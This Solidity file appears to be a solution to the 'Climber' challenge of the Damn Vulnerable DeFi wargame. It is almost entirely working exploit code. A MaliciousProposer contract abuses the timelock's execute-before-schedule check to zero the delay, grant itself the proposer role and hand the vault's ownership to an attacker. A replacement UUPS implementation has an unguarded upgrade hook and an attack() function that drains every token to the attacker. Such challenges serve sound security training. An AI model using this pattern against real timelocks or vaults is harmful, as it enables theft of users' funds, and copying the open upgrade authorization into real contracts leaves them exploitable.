// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../../../src/Contracts/climber/ClimberTimelock.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../../../src/Contracts/climber/ClimberVault.sol";

contract MaliciousProposer {
    ClimberTimelock climberTimelock;
    ClimberVault climberVault;
    address[] targets;
    uint256[] values;
    bytes[] data;

    constructor(address payable _climberTimelock, address _climberVault) {
        climberTimelock = ClimberTimelock(_climberTimelock);
        climberVault = ClimberVault(_climberVault);
    }

    function changeAdmin(address attacker) public {
        // We update delay to zero firts
        targets.push(address(climberTimelock));
        data.push(abi.encodeWithSignature("updateDelay(uint64)", 0));

        // Then we grant proposer role to this contract as we are the one who will call the schedule() function via our scheduleWrapper()
        targets.push(address(climberTimelock));
        data.push(
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                PROPOSER_ROLE,
                address(this)
            )
        );

        // we transfer ownership to an attacker by calling a `transferOwnership` function on vault contract
        targets.push(address(climberVault));
        data.push(
            abi.encodeWithSignature("transferOwnership(address)", attacker)
        );

        // After that we schedule all this data (encoding the wrapper function)
        targets.push(address(this));
        data.push(abi.encodeWithSignature("scheduleWrapper()"));

        // Value we send
        values.push(0);
        values.push(0);
        values.push(0);
        values.push(0);

        climberTimelock.execute(targets, values, data, 0);
    }

    function scheduleWrapper() public {
        climberTimelock.schedule(targets, values, data, 0);
    }
}

//
contract NewImplementation is
    Initializable,
    OwnableUpgradeable,
    UUPSUpgradeable
{
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    // proxy will delegatecall this function
    function attack(address token, address attacker) public {
        IERC20(token).transfer(
            attacker,
            IERC20(token).balanceOf(address(this))
        );
    }

    function _authorizeUpgrade(
        address newImplementation
    ) internal virtual override {}
}
